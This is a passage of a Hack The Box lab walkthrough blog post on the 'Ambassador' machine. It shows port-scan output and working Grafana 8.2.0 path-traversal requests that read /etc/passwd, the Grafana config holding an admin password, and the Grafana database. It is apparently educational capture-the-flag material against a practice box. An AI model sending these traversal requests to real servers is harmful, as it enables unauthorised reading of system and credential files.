<!DOCTYPE html>









<!-- `site.alt_lang` can specify a language different from the UI -->
<html lang="en"
  
    data-mode="dark"
  
>

  <!--
  The Head
-->

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  

    

    

  

  

  
    
    
    

    
      <!-- it's a local file path -->

    
  

  
    <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.3.2" />
<meta property="og:title" content="Hack The Box - Ambassador" />
<meta property="og:locale" content="en" />
<meta name="description" content="This was a really fun box where I had to use multiple vulnerabilities. There was a Local File Inclusion (LFI), credentials stored in clear, misconfiguration, and a Git repository with a token in it." />
<meta property="og:description" content="This was a really fun box where I had to use multiple vulnerabilities. There was a Local File Inclusion (LFI), credentials stored in clear, misconfiguration, and a Git repository with a token in it." />
<link rel="canonical" href="http://localhost:4000/posts/HackTheBox-Walkthrough-Ambassador/" />
<meta property="og:url" content="http://localhost:4000/posts/HackTheBox-Walkthrough-Ambassador/" />
<meta property="og:site_name" content="Ankit Kanojiya" />
<meta property="og:image" content="http://localhost:4000/assets/images/Ambassador/Amber.png" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2023-01-28T00:00:00+08:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:image" content="http://localhost:4000/assets/images/Ambassador/Amber.png" />
<meta property="twitter:title" content="Hack The Box - Ambassador" />
<meta name="twitter:site" content="@AnkitKanojiya69" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-01-28T00:00:00+08:00","datePublished":"2023-01-28T00:00:00+08:00","description":"This was a really fun box where I had to use multiple vulnerabilities. There was a Local File Inclusion (LFI), credentials stored in clear, misconfiguration, and a Git repository with a token in it.","headline":"Hack The Box - Ambassador","image":"http://localhost:4000/assets/images/Ambassador/Amber.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/HackTheBox-Walkthrough-Ambassador/"},"url":"http://localhost:4000/posts/HackTheBox-Walkthrough-Ambassador/"}</script>
<!-- End Jekyll SEO tag -->

  

  <title>Hack The Box - Ambassador | Ankit Kanojiya
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">
<link rel="manifest" href="/assets/img/favicons/site.webmanifest">
<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="Ankit Kanojiya">
<meta name="application-name" content="Ankit Kanojiya">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  

    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      <link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin>
    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://cdn.jsdelivr.net" >
      <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
    

    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">

  

  <!-- GA -->
  

  <!-- Bootstrap -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css">

  <link rel="stylesheet" href="/assets/css/style.css">

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css">
  

  
    <!-- Manific Popup -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css">
  

  <!-- JavaScript -->

  <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>

  
</head>


  <body data-spy="scroll" data-target="#toc" data-topbar-visible="true">

    <!--
  The Side Bar
-->

<div id="sidebar" class="d-flex flex-column align-items-end">
  <div class="profile-wrapper text-center">
    <div id="avatar">
      <a href="/" class="mx-auto">
        
          
          <img src="/assets/img/avtar.jpg" alt="avatar" onerror="this.style.display='none'">
        
      </a>
    </div>

    <div class="site-title">
      <a href="/">Ankit Kanojiya</a>
    </div>
    <div class="site-subtitle font-italic">ùêÑùê≠ùê°ùê¢ùêúùêöùê• ùêáùêöùêúùê§ùêûùê´ || ùêíùê®ùêüùê≠ùê∞ùêöùê´ùêû ùêÑùêßùê†ùê¢ùêßùêûùêûùê´ || ùêÇùê≤ùêõùêûùê´ ùêíùêûùêúùêÆùê´ùê¢ùê≠ùê≤ ùêëùêûùê¨ùêöùê´ùêúùê°ùêûùê´.!! ùêéùêíùêÇùêè & ùêéùêíùêÑùêè.</div>

  </div><!-- .profile-wrapper -->

  <ul class="w-100">

    <!-- home -->
    <li class="nav-item">
      <a href="/" class="nav-link">
        <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i>
        <span>HOME</span>
      </a>
    </li>
    <!-- the real tabs -->
    
    <li class="nav-item">
      <a href="/categories/" class="nav-link">
        <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>CATEGORIES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/tags/" class="nav-link">
        <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>TAGS</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/archives/" class="nav-link">
        <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>ARCHIVES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/about/" class="nav-link">
        <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>ABOUT</span>
      </a>
    </li> <!-- .nav-item -->
    

  </ul> <!-- ul.nav.flex-column -->

  <div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center">

    

    
      

      
      <a href="https://github.com/ankit0183" aria-label="github"
        target="_blank" rel="noopener">
        <i class="fab fa-github"></i>
      </a>
      

    
      

      
      <a href="https://twitter.com/AnkitKanojiya69" aria-label="twitter"
        target="_blank" rel="noopener">
        <i class="fab fa-twitter"></i>
      </a>
      

    
      

      
      <a href="
          javascript:location.href = 'mailto:' + ['ankitkanojiya','yandex.ru'].join('@')" aria-label="email"
        >
        <i class="fas fa-envelope"></i>
      </a>
      

    
      

      
      <a href="/feed.xml" aria-label="rss"
        >
        <i class="fas fa-rss"></i>
      </a>
      

    

  </div> <!-- .sidebar-bottom -->

</div><!-- #sidebar -->


    <!--
  The Top Bar
-->

<div id="topbar-wrapper">
  <div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4">
    <span id="breadcrumb">

    

    

      

        
          <span>
            <a href="/">
              Home
            </a>
          </span>

        

      

        

      

        

          
            <span>Hack The Box - Ambassador</span>
          

        

      

    

    </span><!-- endof #breadcrumb -->

    <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i>

    <div id="topbar-title">
      Post
    </div>

    <i id="search-trigger" class="fas fa-search fa-fw"></i>
    <span id="search-wrapper" class="align-items-center">
      <i class="fas fa-search fa-fw"></i>
      <input class="form-control" id="search-input" type="search"
        aria-label="search" autocomplete="off" placeholder="Search...">
    </span>
    <span id="search-cancel" >Cancel</span>
  </div>

</div>


    <div id="main-wrapper" class="d-flex justify-content-center">
      <div id="main" class="container pl-xl-4 pr-xl-4">
        





<div class="row">

  <!-- core -->
  <div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4">
    <div class="post pl-1 pr-1 pl-md-2 pr-md-2">

    

    
      
      
        <!--
  Refactor the HTML structure.
-->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Change the icon of checkbox -->


<!-- images -->




  
  

  
    
      
      
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      
        
      
      

      
      

      

      
    
      
      
        

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      
        
      
      
        
      
      

      
      

      

      
    
      
      
        
      
      
        

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      

      
      

      

      
    

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      
        
      
      

      
      

      

      
    
      
      
        

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  

  



<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    

    

  

  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    

    

  

  
  

  

  
  

  




<!-- Wrap prompt element of blockquote with the <div> tag -->







<!-- return -->

<h1 data-toc-skip>Hack The Box - Ambassador</h1>

<div class="post-meta text-muted">
    <!-- published date -->
    <span>
      Posted
      <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class=""
    data-ts="1674835200"
    data-df="ll"
    data-toggle="tooltip" data-placement="bottom">
  Jan 28, 2023
</em>

    </span>

    <!-- lastmod date -->
    

  
    

    <div class="mt-3 mb-3">
      <img data-src="/assets/images/Ambassador/Amber.png" class="preview-img bg"
        alt="Preview Image"

      

       data-proofer-ignore>

      

    </div>
  

  <div class="d-flex justify-content-between">
    <!-- author(s) -->
    <span>
      

      By

      <em>
      
        <a href="https://twitter.com/AnkitKanojiya69">Ankit Kanojiya</a>
      
      </em>
    </span>

    <div>
      <!-- page views -->
      

      <!-- read time -->
      <!--
  Calculate the post's reading time, and display the word count in tooltip
 -->



<!-- words per minute  -->










<!-- return element -->
<span class="readtime" data-toggle="tooltip" data-placement="bottom"
  title="4150 words">
  <em>23 min</em> read</span>

    </div>

  </div> <!-- .d-flex -->

</div> <!-- .post-meta -->

<div class="post-content">
  <p>This was a really fun box where I had to use multiple vulnerabilities. There was a Local File Inclusion (LFI), credentials stored in clear, misconfiguration, and a Git repository with a token in it.</p>

<ul>
  <li>Room: Ambassador</li>
  <li>Difficulty: Medium</li>
  <li>URL: <a href="https://app.hackthebox.com/machines/Ambassador">https://app.hackthebox.com/machines/Ambassador</a></li>
  <li>Author: <a href="https://app.hackthebox.com/users/24906">DirectRoot</a></li>
</ul>

<h2 id="enumeration"><span class="mr-2">Enumeration</span><a href="#enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>I launched Rustscan to check the box for open ports.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>rustscan <span class="nt">-a</span> target <span class="nt">--</span> <span class="nt">-A</span> | <span class="nb">tee </span>rust.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| <span class="o">{}</span>  <span class="o">}</span>| <span class="o">{</span> <span class="o">}</span> |<span class="o">{</span> <span class="o">{</span>__ <span class="o">{</span>_   _<span class="o">}{</span> <span class="o">{</span>__  /  ___<span class="o">}</span> / <span class="o">{}</span> <span class="se">\ </span>|  <span class="sb">`</span>| |
| .-. <span class="se">\|</span> <span class="o">{</span>_<span class="o">}</span> |.-._<span class="o">}</span> <span class="o">}</span> | |  .-._<span class="o">}</span> <span class="o">}</span><span class="se">\ </span>    <span class="o">}</span>/  /<span class="se">\ </span> <span class="se">\|</span> |<span class="se">\ </span> |
<span class="sb">`</span>-<span class="s1">' `-'</span><span class="sb">`</span><span class="nt">-----</span><span class="s1">'`----'</span>  <span class="sb">`</span>-<span class="s1">'  `----'</span>  <span class="sb">`</span><span class="nt">---</span><span class="s1">' `-'</span>  <span class="sb">`</span>-<span class="s1">'`-'</span> <span class="sb">`</span>-<span class="s1">'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
üåçHACK THE PLANETüåç

[~] The config file is expected to be at "/home/ehogue/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan'</span>s speed. Use the Docker image, or up the Ulimit with <span class="s1">'--ulimit 5000'</span><span class="nb">.</span>
Open 10.129.111.97:22
Open 10.129.111.97:80
Open 10.129.111.97:3000
Open 10.129.111.97:3306
<span class="o">[</span>~] Starting Script<span class="o">(</span>s<span class="o">)</span>
<span class="o">[&gt;]</span> Script to be run Some<span class="o">(</span><span class="s2">"nmap -vvv -p  "</span><span class="o">)</span>

<span class="o">[</span>~] Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-11-08 18:51 EST
NSE: Loaded 155 scripts <span class="k">for </span>scanning.
NSE: Script Pre-scanning.
Scanning 10.129.111.97 <span class="o">[</span>2 ports]

...

Scanned at 2022-11-08 18:51:04 EST <span class="k">for </span>118s

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   3072 29dd8ed7171e8e3090873cc651007c75 <span class="o">(</span>RSA<span class="o">)</span>
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDLYy5+VCwR+2NKWpIRhSVGI1nJQ5YeihevJqIYbfopEW03vZ9SgacRzs4coGfDbcYa+KPePbz2n+2zXytEPfzBzFysLXgTaUlDFcDqEsWP9pJ5UYFNfXqHCOyDRklsetFOBcxkgC8/IcHDJdJQTEr51KLF75ZXaEIcjZ+XuQWsOrU5DJPrAlCmG12OMjsnP4OfI
4RpIjELuLCyVSItoin255/99SSM3koBheX0im9/V8IOpEye9Fc2LigyGA+97wwNSZG2G/duS6lE8pYz1unL+Vg2ogGDN85TkkrS3XdfDLI87AyFBGYniG8+SMtLQOd6tCZeymGK2BQe1k9oWoB7/J6NJ0dylAPAVZ1sDAU7KCUPNAex8q6bh0KrO/5zVbpwMB+qEq6SY6crjtfpYnd7+2DLwiYgcSiQxZMnY3ZkJiIf
6s5FkJYmcf/oX1xm/TlP9qoxRKYqLtEJvAHEk/mK+na1Esc8yuPItSRaQzpCgyIwiZCdQlTwWBCVFJZqrXc<span class="o">=</span>
|   256 80a4c52e9ab1ecda276439a408973bef <span class="o">(</span>ECDSA<span class="o">)</span>
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFgGRouCNEVCXufz6UDFKYkcd3Lmm6WoGKl840u6TuJ8+SKv77LDiJzsXlqcjdeHXA5O87Us7Npwydhw9NYXXYs<span class="o">=</span>
|   256 f590ba7ded55cb7007f2bbc891931bf6 <span class="o">(</span>ED25519<span class="o">)</span>
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINujB7zPDP2GyNBT4Dt4hGiheNd9HOUMN/5Spa21Kg0W
80/tcp   open  http    syn-ack Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
| http-methods:
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-generator: Hugo 0.94.2
|_http-title: Ambassador Development Server
|_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
3000/tcp open  ppp?    syn-ack
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.0 302 Found

...

3306/tcp open  mysql   syn-ack MySQL 8.0.30-0ubuntu0.20.04.2
| mysql-info:
|   Protocol: 10
|   Version: 8.0.30-0ubuntu0.20.04.2
|   Thread ID: 11
|   Capabilities flags: 65535
|   Some Capabilities: InteractiveClient, Support41Auth, Speaks41ProtocolNew, SwitchToSSLAfterHandshake, SupportsTransactions, IgnoreSigpipes, LongPassword, LongColumnFlag, Speaks41ProtocolOld, ConnectWithDatabase, DontAllowDatabaseTab
leColumn, IgnoreSpaceBeforeParenthesis, FoundRows, SupportsLoadDataLocal, SupportsCompression, ODBCClient, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: o<span class="sb">`</span>H<span class="se">\x</span>0CL|]MTAjm<span class="se">\x</span>0CIM<span class="se">\x</span>1F<span class="s1">'8%\x1F
|_  Auth Plugin Name: caching_sha2_password
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :

...

Nmap done: 1 IP address (1 host up) scanned in 118.61 seconds
</span></pre></td></tr></tbody></table></code></div></div>

<p>The box had four open ports</p>

<ul>
  <li>22 - SSH</li>
  <li>80 - HTTP</li>
  <li>3000 - HTTP</li>
  <li>3306 - MySQL</li>
</ul>

<h2 id="website"><span class="mr-2">Website</span><a href="#website" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>I opened a browser and navigated to the site on port 80.</p>

<p><img data-src="/assets/images/Ambassador/AmbassadorDevelopmentServer.png" alt="Ambassador Development Server" title="Ambassador Development Server" data-proofer-ignore></p>

<p>The site was pretty simple. It had a single post. This post had instructions about connecting to a development environment. It said to use <code class="language-plaintext highlighter-rouge">developer</code> and that the password would be provided.</p>

<blockquote>
  <p>Connecting to this machine</p>

  <p>Use the developer account to SSH, DevOps will give you the password.</p>
</blockquote>

<p>I looked around for a hidden password but did not find anything. I ran Feroxbuster to look for hidden pages, but nothing came up.</p>

<h2 id="grafana"><span class="mr-2">Grafana</span><a href="#grafana" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>Next, I looked at what was on port 3000.</p>

<p><img data-src="/assets/images/Ambassador/Grafana.png" alt="Grafana" title="Grafana" data-proofer-ignore></p>

<p>It was running <a href="https://grafana.com/">Grafana</a>. And it was telling me that it ran version 8.2.0. I looked for vulnerabilities in this version and found that it was vulnerable to <a href="https://grafana.com/blog/2021/12/07/grafana-8.3.1-8.2.7-8.1.8-and-8.0.7-released-with-high-severity-security-fix/">LFI</a>. There was also a <a href="https://www.exploit-db.com/exploits/50581">script on Exploit-DB</a> that showed how to abuse it.</p>

<p>All I needed to do was have the path to a plugin followed by a bunch of <code class="language-plaintext highlighter-rouge">../</code> and the path to the file I wanted to read. The LFI could not be done in a browser, because the extra <code class="language-plaintext highlighter-rouge">../</code> would get removed. But it worked well in Burp Repeater.</p>

<p>I tried to read <code class="language-plaintext highlighter-rouge">/etc/password</code>.</p>

<div class="language-http highlighter-rouge"><div class="code-header">
        <span data-label-text="Http"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre><span class="nf">GET</span> <span class="nn">/public/plugins/alertlist/../../../../../../../../../../../../../etc/passwd</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">target.htb:3000</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">redirect_to=%2Fetc%2Fpasswd</span>
<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
</pre></td></tr></tbody></table></code></div></div>

<p>And it worked.</p>

<div class="language-http highlighter-rouge"><div class="code-header">
        <span data-label-text="Http"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
</pre></td><td class="rouge-code"><pre><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
<span class="na">Accept-Ranges</span><span class="p">:</span> <span class="s">bytes</span>
<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">no-cache</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">1983</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/plain; charset=utf-8</span>
<span class="na">Expires</span><span class="p">:</span> <span class="s">-1</span>
<span class="na">Last-Modified</span><span class="p">:</span> <span class="s">Mon, 14 Mar 2022 02:56:37 GMT</span>
<span class="na">Pragma</span><span class="p">:</span> <span class="s">no-cache</span>
<span class="na">X-Content-Type-Options</span><span class="p">:</span> <span class="s">nosniff</span>
<span class="na">X-Frame-Options</span><span class="p">:</span> <span class="s">deny</span>
<span class="na">X-Xss-Protection</span><span class="p">:</span> <span class="s">1; mode=block</span>
<span class="na">Date</span><span class="p">:</span> <span class="s">Wed, 09 Nov 2022 00:20:01 GMT</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
developer:x:1000:1000:developer:/home/developer:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
grafana:x:113:118::/usr/share/grafana:/bin/false
mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
consul:x:997:997::/home/consul:/bin/false
</pre></td></tr></tbody></table></code></div></div>

<p>I found the LFI vulnerability quickly, but from there it took me a while to find how to use it. I read a bunch of files, but nothing I could use to get access to the server.</p>

<p>I read the Grafana configuration.</p>

<div class="language-http highlighter-rouge"><div class="code-header">
        <span data-label-text="Http"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre><span class="nf">GET</span> <span class="nn">/public/plugins/alertlist/../../../../../../../../../../../../../etc/grafana/grafana.ini</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">target.htb:3000</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">redirect_to=%2F</span>
<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
</pre></td></tr></tbody></table></code></div></div>

<p>It returned a huge configuration file. It contained an admin password.</p>

<div class="language-ini highlighter-rouge"><div class="code-header">
        <span data-label-text="Ini"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre><span class="c">#################################### Security ####################################
</span><span class="nn">[security]</span>
<span class="c"># disable creation of admin user on first start of grafana
;disable_initial_admin_creation = false
</span>
<span class="c"># default admin user, created on startup
;admin_user = admin
</span>
<span class="c"># default admin password, can be changed before first start of grafana,  or in profile settings
</span><span class="py">admin_password</span> <span class="p">=</span> <span class="s">REDACTED</span>
</pre></td></tr></tbody></table></code></div></div>

<p>I used the password to login in Grafana.</p>

<p><img data-src="/assets/images/Ambassador/LoggedInGrafana.png" alt="Logged In" title="Logged In" data-proofer-ignore></p>

<p>I spent some time trying to find something in Grafana. Maybe I could use it to run some commands on the server. But I did not find anything.</p>

<p>After a while, I went back to the LFI and used it to extract an SQLite database.</p>

<div class="language-http highlighter-rouge"><div class="code-header">
        <span data-label-text="Http"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre><span class="nf">GET</span> <span class="nn">/public/plugins/alertlist/../../../../../../../../../../../../../var/lib/grafana/grafana.db</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
